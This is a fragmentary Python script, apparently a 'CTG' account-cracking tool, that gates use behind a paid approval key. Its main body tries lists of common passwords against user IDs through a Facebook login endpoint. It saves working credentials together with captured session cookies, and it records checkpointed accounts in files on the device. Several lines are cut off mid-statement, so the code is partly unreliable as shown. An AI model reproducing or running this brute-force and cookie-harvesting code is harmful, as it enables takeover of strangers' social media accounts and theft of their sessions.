...
# REVERSE BY MR. MINHAJ
# TEAM DARK CTG FORCE - 71
...
time.sleep(3)
os.system('clear')
print('\x1b[38;5;244m[\x1b[38;5;46m●\x1b[38;5;244m]\x1b[38;5;46m LODING ●\x1b[38;5;47m●\x1b[38;5;48m●\x1b[38;5;49m●\x1b[38;5;50m●\x1b[38;5;244m [\x1b[38;5;46mCTG TOOL\x1b[38;5;244m]\x1b[1;97m')
time.sleep(2)
try:
...
sys.stdout.write('\x1b]2; =(💚)-CTG-PRO-(💚)=\x07')
...
#-------------------// APPROVAL \\---------------------#
import os,httpx
sexkey = "CTG~("+str(os.getuid())+"=(CYBER)="+str(os.getuid())+")~PRO"
def approval():
    sexkey = "CTG~("+str(os.getuid())+"=(CYBER)="+str(os.getuid())+")~PRO"
    ress=httpx.get("https://github.com/NAY44M/NAY44M/blob/main/Bilai").text
    if sexkey in ress:
        menu()
    else:
        ...
        time.sleep(2)
        tks = sexkey
        os.system('xdg-open https://wa.me/+8801610972484')
    ...
    try:
        ...
        for pw in ["123456","1234567","12345678","123456789","123123","112233","1234567890"]:
            ...
            if "session_key" in rp:
                print(f"\r\x1b[38;5;244m(\x1b[38;5;244mCTG-OK\x1b[38;5;244m)\x1b[38;5;244m {uid} ━\x1b[38;5;244m➤\x1b[38;5;46m {pw}")
                open("/sdcard/CTG-OLD.txt","a").write(uid+"|"+pw+"\n")
                cps.append(uid)
                break 
            elif "www.facebook.com" in rp["error_msg"]:              
                print(f"\r\x1b[38;5;244m(\x1b[38;5;46mCTG-OK\x1b[38;5;244m)\x1b[38;5;46m {uid} ━\x1b[38;5;244m➤\x1b[38;5;46m {pw}")
                open("/sdcard/CTG-OLD.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break
        ...
        try:
                ...
                for pw in passlist:
                        ...
                        if 'session 
                                        ...
                                        linex()
                                        open('/sdcard/CTG-FILE-M1-OK.txt', 'a').write(ids+' | '+pas+' |-> '+coki+"\n")
                                        oks.append(ids)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print(f'\r\r\x1b[38;5;244m({Y}CTG-CP\x1b[38;5;244m){Y} '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/CTG-CP.txt','a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                break
        ...
        try:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        print(f"\r\r\x1b[38;5;244m=(\x1b[38;5;46m💥\x1b[38;5;244m)={A} "+coki)
                                        linex()
                                        open('/sdcard/CTG-FILE-M2-OK.txt', 'a').write(ids+' | '+pas+' |-> '+coki+"\n")
                                        oks.append(ids)
                                        break
                        elif 'www.facebook.com'
                                        if 'y' in pcp:
                                                print(f'\r\r\x1b[38;5;244m({Y}CTG-CP\x1b[38;5;244m){Y} '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/CTG-CP.txt','a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
...
def rndm1(uid,passlist):
        ...
        try:
                for pas in passlist:
                        ...
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' i
                                        print(f'\r\r\x1b[38;5;244m(\x1b[38;5;46mCTG-OK\x1b[38;5;244m)\x1b[38;5;46m '+uid+f' ━\x1b[38;5;244m➤\x1b[38;5;46m '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f"\r\r\x1b[38;5;244m(\x1b[38;5;46mCOOKIE\x1b[38;5;244m)>{A} "+coki)
                                        open('/sdcard/CTG-RANDOM-M1-OK.txt', 'a').write(uid+' | '+pas+' |-> '+coki+"\n")
                                        oks.append(uid)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print(f'\r\r\x1b[38;5;244m({Y}CTG-CP\x1b[38;5;244m){Y} '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcard/CTG-CP.txt','a').write(uid+'|'+pas+'\n')
                                                break
                                        else:
                                                break
                        else:
